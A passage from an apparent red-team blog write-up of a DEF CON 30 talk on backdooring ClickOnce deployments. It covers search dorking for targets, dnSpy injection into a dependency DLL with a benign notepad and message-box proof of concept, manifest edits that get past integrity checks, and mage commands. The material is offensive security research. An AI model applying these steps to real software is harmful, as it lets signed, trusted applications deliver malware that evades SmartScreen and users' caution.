src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FLU0Ec8Z9JpU%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLU0Ec8Z9JpU&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FLU0Ec8Z9JpU%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO1\" width=\"854\"></iframe>\n\n---\n\n## Current ClickOnce Weaponization Pressure Points\n\nAs seen in the first demo, we experience a few issues. For instance, Microsoft SmartScreen was triggered. This is because the assembly that ultimately executed with our arbitrary code was compiled recently and had never been seen by SmartScreen before. The reputation for Microsoft SmartScreen can be based on a number of factors such as the hash of the host assembly or the certificate used to sign the assembly.\n\nAchieving arbitrary code execution within the context of an application seen and otherwise trusted by Microsoft SmartScreen or EDR products can decrease likelihood of prevention. Solutions such as application control or whitelisting prevention can be noteworthy when considering how we want to conduct our code execution, especially during initial access attempts. An Extended Validation (EV) code signing certificate can be used to obtain immediate SmartScreen reputation, but the vetting process and price point increase the barrier to entry. When code-signing certificates are used, there are also additional attribution concerns.\n\nGenerally, a ClickOnce deployment can be tedious to make sure “all the stars align” for a successful deployment. Oftentimes people view ClickOnce as tedious to deploy successfully and having many configuration requirements. We hope the next couple sections outline the important fields within ClickOnce manifests to focus on, to assist in reproducing these techniques.\n\n---\n\n## Alleviation of ClickOnce Weaponization Pressure Points\n\nIf legitimate .NET applications make use of ClickOnce, and we can reliably sideload or hijack those .NET applications, why not just backdoor an existing deployment? An existing deployment that already has, lets say, a valid EV code signature and SmartScreen reputation?\n\n> **NOTE:** We will backdoor a dependency of a ClickOnce deployment, not the host assembly itself. We *maintain the valid signature* associated with that host assembly.\n\nIdentifying existing ClickOnce deployments can be as easy as leveraging a couple search engine dorking techniques (or using the ClickonceHunter tool which will be covered later). Several tools can be used throughout this process (e.g. dnSpy, reshacker, mage, sigcheck, etc).\n\n```image\nAlt: Download of ClickOnce Application Discovered from Google\nDescription: The image displays a screenshot showing a file directory structure on the left, indicating files related to a ClickOnce application deployment, including 'publish.htm' and 'setup.exe'. On the right, there is a Google search result for the term 'inurl:publish.htm', showing various links that include prerequisites for running a specific .NET application. The search results display descriptions about required software components, highlighting the potential for identifying ClickOnce deployments online.\nTranscription: |\n  Folder Structure:\n  source\n  └── repos\n      └── Clickonce_Demo1\n          └── clickonce_published\n              ├── Application Files\n              ├── Clickonce_Demo1.application\n              ├── publish.htm\n              └── setup.exe\n  \n  Date modified:\n  - publish.htm: 7/10/2022 12:31 AM\n  - Clickonce_Demo1.application: 7/10/2022 12:31 AM\n  - setup.exe: 7/10/2022 12:31 AM\n  \n  Google Search Results for \"inurl:publish.htm 'The following prerequisites'\":\n  Page 14 of about 1,860 results (0.47 seconds)\n  1. http://[...]/publish\n     Publisher: The following prerequisites are required: Windows Installer 3.1 .NET Framework 3.5 SP1; SQL Server Compact 3.5; if these components are already ...\n  \n  2. http://[...]/publish\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); Windows Installer 4.5; if these components are already installed, you can launch ...\n  \n  3. https://[...]\n     Publisher: The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64); if these components are already installed, you can launch ...\n```\n\nWe will want to identify sideloading opportunities for dependencies of the target .NET assembly that the ClickOnce deployment will execute. Any way for us to hijack the flow of execution shortly after the application entry point is what we are looking for. Oftentimes this process consists of using dnSpy to decompile the target .NET assembly to understand the execution flow enough to identify a sideload opportunity.\n\nOnce an ideal DLL to backdoor has been identified, use dnSpy to add your code to the target DLL. At this point, the ClickOnce manifests of the deployment you’ve chosen will need to be tweaked to pass their integrity checks. If you cannot identify an ideal sideload opportunity in the existing codepath(s), techniques such as AppDomainManager injection or .NET deserialization abuse can be helpful here.\n\nThe image below is a quick example of what sideloading an existing, signed ClickOnce deployment would look like. First, we find a ClickOnce deployment published online, download it, and verify the assembly that the deployment executes meets our needs (valid code signature, SmartScreen reputation, etc):\n\n```image\nAlt: Example of Signed ClickOnce Application\nDescription: The image displays the properties window of a ClickOnce application file named 'Defcon30_Demo.exe'. On the left, the 'Security' tab shows the signature list, while the right side contains details about the digital certificate used to sign the executable. The certificate information indicates its purpose, which includes ensuring that the software originates from the software publisher and protecting it from alteration after publication. It details the issuer as 'DigiCert SHA2 Assured ID Code Signing CA' and specifies the validity dates of the certificate, from May 17, 2021, to May 21, 2023. This information is relevant for understanding the security measures and integrity of the ClickOnce application.\nTranscription: |\n  Defcon30_Demo.exe Properties\n  7/17/2022 8:04 PM\n  Application\n  238 KB\n  \n  Security\n  General\n  Compatibility\n  Details\n  Previous Versions\n  Digital Signatures\n  \n  Certificate\n  - Signature list\n    Name of signer: [Redacted]\n  \n  Certificate Information\n  This certificate is intended for the following purpose(s):\n  - Ensures software came from software publisher\n  - Protects software from alteration after publication\n  \n  * Refer to the certification authority's statement for details.\n  \n  Issued to: [Redacted]\n  Issued by: DigiCert SHA2 Assured ID Code Signing CA\n  Valid from 5/17/2021 to 5/21/2023\n```\n\nNext we take a look at the references within the signed .NET assembly we want to sideload. A few of the DLLs the assembly uses are not strongly named, which can be helpful in certain situations:\n\n```image\nAlt: Dependencies of Target Assembly\nDescription: The image displays a screenshot of dnSpy, a tool used for decompiling .NET assemblies. In this view, the 'Assembly Explorer' panel is shown, highlighting the references of a .NET assembly. Several assembly references are listed, with particular attention drawn to those that have a null 'PublicKeyToken'. This indicates the assemblies may not be strongly named, which is relevant for possible sideloading opportunities in the context of backdooring ClickOnce applications.\nTranscription: |\n  1. // Facilities, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  2. // GR.Presentation.Infra, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  3. // GRBase, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  4. // GRPrincipal, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n  5. // mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\n  6. // System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  7. // System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  8. // System.Deployment, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  9. // System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  10. // WebserviceClients, Version=1.1.7.13875, Culture=neutral, PublicKeyToken=null\n```\n\nUsing DnSpy to begin at the target .NET assembly’s entry point, we follow the code to the first method call of “SetDpiAwareness()”. This function exists within on the the Dlls previously identified:\n\n```image\nAlt: Following the Code Path\nDescription: The image displays a snippet of C# code from a .NET application, specifically showing the 'Main' method of a public static class named 'Program'. The code includes calls to the 'SetDpiAwareness()' method from the 'DpiSettings' class, as well as references to application initialization and user login dialog handling. The highlighted section indicates the location in the code where the 'SetDpiAwareness()' method is invoked, demonstrating the flow of execution for the ClickOnce deployment process discussed in the context.\nTranscription: |\n  public static class Program\n  {\n      // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00002050\n      [STAThread]\n      public static void Main()\n      {\n          try\n          {\n              DpiSettings.SetDpiAwareness();\n              Application.EnableVisualStyles();\n              Application.SetCompatibleTextRenderingDefault(false);\n              Context.Inicializa();\n              Program.verificaProxy();\n              Program.verificaVersao();\n              FLogin flogin = new FLogin();\n              flogin.ShowDialog();\n              if (flogin.DialogResult != DialogResult.OK)\n              {\n                  Application.Exit();\n              }\n              else\n              {\n                  // Additional code can go here\n              }\n          }\n      }\n  }\n```\n\nWe observe the code within this method and verify it exists within a DLL dependency (not the host .NET assembly):\n\n```image\nAlt: Identified Location to Place Additional Code\nDescription: The image displays a snippet of C# code from a .NET application, specifically a method named 'SetDpiAwareness'. The code is structured in a way that checks the Windows version and sets process DPI awareness accordingly. It includes multiple conditional statements that handle different Windows versions such as Windows 7, 8, 10, and 2008. This code is relevant in the context of the ClickOnce deployment discussion, illustrating a potential point for injecting additional code into a .NET application.\nTranscription: |\n  // Token: 0x060000AD RID: 173 RVA: 0x00005274 File Offset: 0x00003474\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          string name = WindowsVersion.Name;\n          if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n          {\n              if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n              {\n                  if (name == \"Windows10\")\n                  {\n                      DpiSettings.SetProcessDpiAwarenessContext(16);\n                  }\n                  else\n                  {\n                      DpiSettings.SetProcessDpiAwareness(0);\n                  }\n              }\n              else\n              {\n                  DpiSettings.SetProcessDPIAware();\n              }\n          }\n      }\n  }\n```\n\nThe additional code we’d like to sideload the ClickOnce deployment with can be added here. For proof-of-concept sake, we will just spawn notepad and prompt with a MessageBox:\n\n```image\nAlt: Adding Code to Target Dependency\nDescription: The image displays a snippet of C# code demonstrating a method called `SetDpiAwareness()`. This method includes functionality to execute arbitrary code by starting 'notepad.exe', displaying a message box indicating 'Malicious Code Executed', and includes logic related to the Windows version. The code is annotated with comments and structured to suggest it is part of a proof-of-concept for backdooring a ClickOnce deployment.\nTranscription: |\n  public static void SetDpiAwareness()\n  {\n      try\n      {\n          Thread.Sleep(1500);\n          Process.Start(\"notepad.exe\");\n          Thread.Sleep(1500);\n          System.Windows.Forms.MessageBox.Show(\"Signed and trusted process executing our arbitrary code.\", \"Malicious Code Executed\", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);\n          Application.Exit;\n      }\n      string name = WindowsVersion.Name;\n      if (!(name == \"Windows7\") && !(name == \"Windows2008\"))\n      {\n          if (!(name == \"Windows8\") && !(name == \"Windows81\"))\n          {\n              if (name == \"Windows10\")\n              {\n                  DpiSettings.SetProcessDpiAwarenessContext(16);\n              }\n          }\n          else\n          {\n              DpiSettings.SetProcessDpiAwareness(0);\n          }\n      }\n  }\n```\n\nAt this point, dnSpy can add your changes to intermediary language (IL) and you will have your backdoored dependency of the target ClickOnce application. Now is a good time to test and make sure the additional code you’ve added properly executes when running the host .NET assembly.\n\n> **NOTE:** We previously thought a prerequisite was targeting only non-strongly named DLLs. We discovered this is not a requirement because modifying a DLL does not modify the PublickeyToken value of the DLL. The PublickeyToken value is in reference to the hash of the assembly’s embedded manifest rather than the code itself. If the manifest is not modified, the PublickeyToken value remains the same and will still be loaded successfully.\n\nNow that we have our sideload of a signed .NET application that is part of an existing ClickOnce deployment, our last step to have a functioning deployment is to tweak the two ClickOnce manifests such that the integrity checks that occur during deployment do not fail. Here’s a few tips that will hopefully speed the process up:\n\n- **publicKeyToken** — this value is required, but can be nulled out by replacing the value with 16 zeros\n- **\\<hash\\>** — this block is optional and can be removed or recalculated (EX: *openssl -dgst -binary -sha1 Program.exe.manifest |openssl enc -base64)*\n- **\\<publisherIdentity\\>** — included if the manifests have been signed, but is optional and can be removed\n\nA noteworthy mention regarding modification of an existing ClickOnce manifest is that if the manifest was signed with a valid certificate, then making these modifications will break that integrity. The difference to the end user is minimal and many legitimate ClickOnce deployments do not sign their manifests at all. We still have control of the prompt observed by the target user, such as “Name” and “From”. A signed vs unsigned look similar to the image below:\n\n```image\nAlt: Difference Between Signed and Unsigned Deployment Manifest\nDescription: The image shows two side-by-side screenshots of security warning dialogs related to the ClickOnce deployment process. On the left, the dialog for an unsigned ClickOnce manifest indicates that the publisher cannot be verified, prompting the user to decide whether to run the application. On the right, the dialog for a signed ClickOnce manifest confirms the installation and shows the publisher's name, providing a more reassuring message for the user. The left dialog uses 'Run' and 'Don't Run' buttons, while the right uses 'Install' and 'Don't Install' buttons, highlighting the difference in user trust based on the signing status of the application.\nTranscription: |\n  Application Run - Security Warning\n  Publisher cannot be verified.\n  Are you sure you want to run this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher: Unknown Publisher\n  \n  [Run] [Don't Run]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not run this software. More Information...\n  \n  Unsigned ClickOnce manifest\n  \n  ---\n  \n  Application Install - Security Warning\n  Do you want to install this application?\n  \n  Name:\n  From (Hover over the string below to see the full domain):\n  Publisher:\n  \n  [Install] [Don't Install]\n  \n  While applications from the Internet can be useful, they can potentially harm your computer. If you do not trust the source, do not install this software. More Information...\n  \n  Signed ClickOnce manifest\n```\n\nSo the question posed is this: *Do we really need a code signing certificate to effectively weaponize ClickOnce deployments?*\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FP_xUIOg32BY%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DP_xUIOg32BY&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FP_xUIOg32BY%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO2\" width=\"854\"></iframe>\n\n---\n\n## Extending Past Existing ClickOnce Deployments\n\nThe number of published ClickOnce deployments easily identifiable through dorking is finite. It’s not a new technology, nor is it the most popular to deploy and update .NET applications. We foresaw this as a potential issue and sought to find a way to take *any* ideal .NET assembly, identify a sideload opportunity, and wrap it up as a new ClickOnce deployment. As it turns out, this was possible, with a few prerequisites.\n\n1. The \\<assemblyIdentity\\> field within the embedded application manifest must *not* exist, or the entire embedded application manifest must not exist (more on this in a bit)\n2. The UAC settings cannot be set to ‘requireAdministrator’ or ‘highestAvailable’\n\n.NET assemblies that meet these prerequisites can be weaponized as backdoored ClickOnce deployments relatively easily. The *System.Deployment* DLL has code that checks the assembly identity which is found in the embedded application manifest. This check cross-references the application manifest’s identity to ensure the identity values are the same. The image below shows what the embedded assembly manifest default identity will be if it is present.\n\n```image\nAlt: Example of Default “assemblyIdentity” Field\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes the assembly identity information, specifying the version and name of the application. The manifest structure is outlined with various XML tags indicating security settings, requested privileges, and compatibility with different Windows versions. It shows an example of how to define application properties and UAC (User Account Control) settings within the manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{351b389a-5d96-4fb4-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a46a36b}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\nAs you can see the identity contains two pieces of information, the version and the name. The figure below shows what is in the deployment manifest for the identity value. If you look at the difference there is a value of processorArchitecture.\n\n```image\nAlt: ClickOnce Deployment “assemblyIdentity”\nDescription: The image displays an XML snippet of a .NET assembly manifest. It highlights the `<assemblyIdentity>` element, which contains attributes such as `name`, `version`, `language`, and `processorArchitecture`. The `processorArchitecture` attribute is specifically set to \"amd64\", indicating the architecture type for the assembly. This information is crucial in the context of ClickOnce deployments, as it shows the required identity values in the application manifest.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <asmv1:assembly xsi:schemaLocation=\"urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\" manifestVersion=\"1.0\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\">\n      <asmv1:assemblyIdentity name=\"CasPol.exe\" version=\"1.0.0.0\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n      <application />\n      <entryPoint>\n          <asmv1:assemblyIdentity name=\"MyApplication.app\" version=\"1.0.0.0\" language=\"neutral\" processorArchitecture=\"amd64\"/>\n          <commandLine file=\"CasPol.exe\" parameters=\"\" />\n      </entryPoint>\n  </asmv1:assembly>\n```\n\nThe ‘*processorArchitecture*’ value is a required value to be present for the assembly identity in the deployment manifest.\n\n```image\nAlt: MSDN Documentation Showing Required Values\nDescription: The image presents a table detailing the elements and attributes required for the 'assemblyIdentity' element in a ClickOnce deployment. It includes columns for 'Attribute' and 'Description,' listing attributes such as 'Name,' 'Version,' 'publicKeyToken,' and a highlighted entry for 'processorArchitecture,' which is marked as required. The table emphasizes that the 'assemblyIdentity' must contain no child elements and specifies the necessary attributes for proper identification of the application.\nTranscription: |\n  | Attribute             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n  | --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n  | Name                  | Required. Identifies the name of the application. If Name contains special characters, such as single or double quotes, the application may fail to activate.                                                                                                                                                                                                                                                                                                                |\n  | Version               | Required. Specifies the version number of the application in the following format: major.minor.build.revision                                                                                                                                                                                                                                                                                                                                                                |\n  | publicKeyToken        | Optional. Specifies a 16-character hexadecimal string that represents the last 8 bytes of the SHA-1 hash value of the public key under which the application or assembly is signed. The public key that is used to sign the catalog must be 2048 bits or greater. Although signing an assembly is recommended but optional, this attribute is required. If an assembly is unsigned, you should copy a value from a self-signed assembly or use a \"dummy\" value of all zeros. |\n  | processorArchitecture | Required. Specifies the processor. The valid values are msil for all processors, x86 for 32-bit Windows, IA64 for 64-bit Windows, and Itanium for Intel 64-bit Itanium processors.                                                                                                                                                                                                                                                                                           |\n  | language              | Required. Identifies the two part language codes (for example, en-US) of the assembly. This element is in the asmv2 namespace. If unspecified, the default is neutral.                                                                                                                                                                                                                                                                                                       |\n```\n\nThese two values are checked against each other to validate assembly identities are the same. If the default identity value is present in the assembly’s embedded manifest it will fail because there is no ‘*processorArchitecture*’ value present. Therefore, this type of assembly is not possible to use as a ClickOnce application for our purposes. Modifying this value would require modifying the host assembly of our code execution, losing any benefit of a valid code-signature or reputations with Microsoft SmartScreen.\n\n```image\nAlt: System.Deployment dll Checking Identities\nDescription: The image shows a code snippet from a .NET application, specifically a method named 'Matches' which checks if the identity attributes of a reference identity match exactly with the current object's identity attributes. The code includes comments about tokens and attributes related to identity, along with a view of local variables that highlight the values of 'this', 'refId', and 'exact', providing context to the matching process for application identities in the ClickOnce deployment environment.\nTranscription: |\n  public bool Matches(ReferenceIdentity refId, bool exact)\n  {\n      return IsolationInterop.IdentityAuthority.DoesDefinitionMatchReference(exact ? 1U : 0U, this._idComPtr, refId.ComPointer) && this.Version == refId.Version;\n  }\n  \n  // Token: 0x17000158 RID: 344\n  // (get) Token: 0x60000418 RID: 1048 RVA: 0x0000AC14 File Offset: 0x0000AC14\n  public IDENTITY_ATTRIBUTE[] Attributes\n  {\n      get\n      {\n          IEnumIDENTITY_ATTRIBUTE enumIDENTITY_ATTRIBUTE = null;\n          IDENTITY_ATTRIBUTE[] result;\n      }\n  }\n  \n  Locals\n  this: {MyApplication.app, Version=1.0.0.0, Culture=neutral}\n  refId: {MyApplication.app, Version=1.0.0.0, Culture=neutral, processorArchitecture=amd64}\n  exact: true\n```\n\nFortunately there are a lot of assemblies that exist which do not have an identity in the application’s manifest. In the next section we will show how to identify these assemblies, but in the meantime, the figure below shows what an embedded manifest looks like when the default identity is not set, and a non-default manifest was used during the build process instead.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<asmv1:assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n    <security>\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n        <!-- UAC Manifest Options\n            If you want to change the Windows User Account Control level replace the\n            requestedExecutionLevel node with one of the following.\n\n            <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />\n            <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />\n\n            Specifying requestedExecutionLevel node will disable file and registry virtualization.\n            If you want to utilize File and Registry Virtualization for backward\n            compatibility then delete the requestedExecutionLevel node.\n        -->\n        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />\n      </requestedPrivileges>\n    </security>\n  </trustInfo>\n\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n    <application>\n      <!-- A list of all Windows versions that this application is designed to work with.\n      Windows will automatically select the most compatible environment.-->\n\n      <!-- If your application is designed to work with Windows 7, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n\n      <!-- If your application is designed to work with Windows 8, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>\n\n      <!-- If your application is designed to work with Windows 8.1, uncomment the following supportedOS node-->\n      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n\n      <!-- This Id value indicates the application supports Windows Threshold functionality-->\n      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>\n    </application>\n  </compatibility>\n</asmv1:assembly>\n```\n\nThe second condition that is required is for the UAC settings to not be requiredAdministrator or highestAvailable. Another check by the System.Deployment DLL is it will look for the UAC settings and return errors if the disallowed values are set.\n\n```image\nAlt: UAC Check in System.Deployment DLL\nDescription: The image displays a portion of C# code related to verifying requested privileges for a ClickOnce deployment. It includes methods for checking the User Account Control (UAC) settings and registry values associated with the application's execution level. Key components of the code involve logging, accessing the registry, and throwing exceptions based on the execution level conditions.\nTranscription: |\n  private static void VerifyRequestedPrivilegesSupport(string requestedExecutionLevel)\n  {\n      Logger.AddMethodCall(\"VerifyRequestedPrivilegesSupport(\" + requestedExecutionLevel + \") called.\");\n      if (PlatformSpecific.OnVistaOrAbove)\n      {\n          bool flag = false;\n          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\n          if (registryKey != null && registryKey.GetValue(\"EnableLUA\") == null)\n          {\n              Logger.AddInternalState(\"LUA policy key = \" + registryKey.Name);\n              int num = (int)registryKey.GetValue(\"EnableLUA\");\n              if (num == 0)\n                  flag = true;\n              Logger.AddInternalState(\"LUA is enabled.\");\n          }\n          if (flag && (string.Compare(requestedExecutionLevel, \"requireAdministrator\", StringComparison.OrdinalIgnoreCase) == 0 || string.Compare(requestedExecutionLevel, \"highestAvailable\", StringComparison.OrdinalIgnoreCase) == 0))\n          {\n              throw new InvalidDeploymentException(ExceptionTypes.UnsupportedElevationRequest, string.Format(CultureInfo.CurrentUICulture, Resources.GetString(\"Ex_ManifestExecutionLevelNotSupported\"), new object[0]));\n          }\n      }\n  }\n```\n\nIf UAC information exists, or it is set to ‘asInvoker’ the assembly will work as a ClickOnce deployment.\n\n```image\nAlt: Assembly with No UAC Information\nDescription: The image depicts a user interface of a manifest editor or viewer, showing the XML structure of a ClickOnce application manifest. It highlights the assembly identity, specifying details such as the name, version, processor architecture, and public key token of a dependent assembly. The layout includes a tree view on the left with sections for version information and the manifest, while the main area displays the XML code, indicating the technical details necessary for .NET application deployment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\n    <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->\n    <dependency>\n      <dependentAssembly>\n        <assemblyIdentity\n          type=\"win32\"\n          name=\"Microsoft.Windows.Common-Controls\"\n          version=\"6.0.0.0\"\n          processorArchitecture=\"*\"\n          publicKeyToken=\"********\"\n          language=\"*\"\n        />\n      </dependentAssembly>\n    </dependency>\n  </assembly>\n```\n\nSince we are creating ClickOnce applications from scratch, we will have to create new manifests as opposed to our previous weaponization of modifying existing ClickOnce manifests. Microsoft has a utility that is used for this specific task which is called the Manifest Generation and Editing Tool (Mage). Microsoft makes two different tools that can be used, MageUI and Mage. Mage is a command line tool that comes part of the Windows SDK and for the purpose of this blog will be the one we cover.\n\nOnce you have gone through the process of identifying a .NET assembly that can be wrapped up as a ClickOnce deployment, you will want to create the directory structure of the assembly, dependencies, and extra files. As previously mentioned, there are two manifests that will need to be created with Mage — the deployment manifest and the application manifest. The application manifest can be created with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Application -Processor amd64 -ToFile AppVStreamingUX.exe.manifest -name \"TargetApp\" -Version 1.0.0.0 -FromDirectory .\n```\n\nNext you will need to create the deployment manifest. This can be done with the following command:\n\n```\n\"C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\mage.exe\" -New Deployment -Processor amd64 -Install false -ProviderUrl \"http://localhost/dist/TargetApp.application\" -AppManifest TargetApp.exe.manifest -ToFile TargetApp.application\n```\n\nThe *ProviderUrl* argument is the location where the deployment manifest will be hosted since the primary method we’re covering is web-based applications. Once the manifests are created, you will see there are some signature values that are created with *Mage*. Just like what was covered when editing existing manifests, these values are not always required and can be removed. If any changes are made to the overall deployment, the signatures will be invalidated and will have to be regenerated which can lead to unnecessary troubleshooting. As mentioned previously, these values are:\n\n- **\\<publicKeyToken\\>**, required but can be nulled with 16 zeros\n- **\\<hash\\>** block can be removed altogether and not required\n- **Publisher identity** block can be removed altogether\n\nNow that we have identified an existing signed .NET assembly that can be deployed as a ClickOnce application, we can go through the same backdoor steps as the other technique. We will follow the code paths, identify called DLLs, and place our code inside of those DLLs. Finally, we can create the manifests with Mage and are ready for deployment.\n\n<iframe allowfullscreen=\"\" class=\"em n fe dz bh\" frameborder=\"0\" height=\"480\" scrolling=\"no\" src=\"https://cdn.embedly.com/widgets/media.html?src=https%3A%2F%2Fwww.youtube.com%2Fembed%2FCpuXgqvnNow%3Ffeature%3Doembed&amp;display_name=YouTube&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DCpuXgqvnNow&amp;image=https%3A%2F%2Fi.ytimg.com%2Fvi%2FCpuXgqvnNow%2Fhqdefault.jpg&amp;key=a19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=youtube\" title=\"Defcon30 ClickOnce - DEMO3\" width=\"854\"></iframe>\n\n---\n\n## Identification of .NET Assemblies and ClickOnce Applications\n\nSo far, we’ve covered the types of applications that can be weaponized, and now we want to discover potential targets. We have released two tools that will aid in the discovery of existing ClickOnce applications and .NET assemblies that can be weaponized for ClickOnce.\n\n> ClickonceHunter\n\n- searches online for existing ClickOnce published code\n- Google dorks, Github and others\n\n> AssemblyHunter\n\n- Searches file paths or files and looks for given criteria (signed, identity info, arch, UAC, etc.)\n- Helps identify target applications to weaponize\n\nClickonceHunter will automate what can be done manually with Google or other related searches.\n\n```image\nAlt: Dorking to Discover Third-Party ClickOnce Deployments\nDescription: The image displays a Bing search results page featuring a query for 'ClickOnce and .NET Framework Resources' with a specified file type of .h. The results include several links to different applications and resources related to ClickOnce, such as 'SPC Connect Pro', 'e-Form RS', 'Geriatric Notes Tool - DeerOaks', and 'MicroMaidCloud'. Each result contains a brief description of the resource, indicating the context and functionality of the applications listed.\nTranscription: |\n  inbody:\"ClickOnce and .NET Framework Resources\" AND filetype:html\n  \n  11-24 Of 11,100 Results\n  \n  1. SPC Connect Pro\n     https://www.spconnectpro.com/install\n     Microsoft .NET Framework 4.6.2 (x86 and x64) SPC Connect Pro License Agreement. If these components are already installed, you can launch the application now. Otherwise, click the button…\n  \n  2. e-Form RS\n     https://eformrs.com/eform\n     If the install doesn't start when you click the button, click on the \"Setup.exe\" program in the Downloads list and select Run. ClickOnce and .Net Framework Resources.\n  \n  3. Geriatric Notes Tool - DeerOaks\n     https://gntweb.deeroaks.com/GNT\n     Cragg Consulting Customer Support :: ClickOnce and .NET Framework Resources …\n  \n  4. MicroMaidCloud\n     https://mmcds.micromaidcloud.com/MicroMaidCloud.html\n     The following prerequisites are required: Microsoft .NET Framework 4.5.2 (x86 and x64) If these components are already installed, you can launch the application now…\n```\n\n```image\nAlt: Github Searches for ClickOnce Projects (maybe with signed releases?)\nDescription: The image displays a screenshot of a GitHub search result for the term 'clickonce:manifest.' It shows a total of 60,209 code results, with relevant statistics such as the number of repositories, code files, commits, and issues. The top match is highlighted, showing XML code for a ClickOnce application manifest file, indicating details about the assembly and identity of the application. The interface is dark-themed, typical of GitHub's design, and provides a structured view of search results and metadata.\nTranscription: |\n  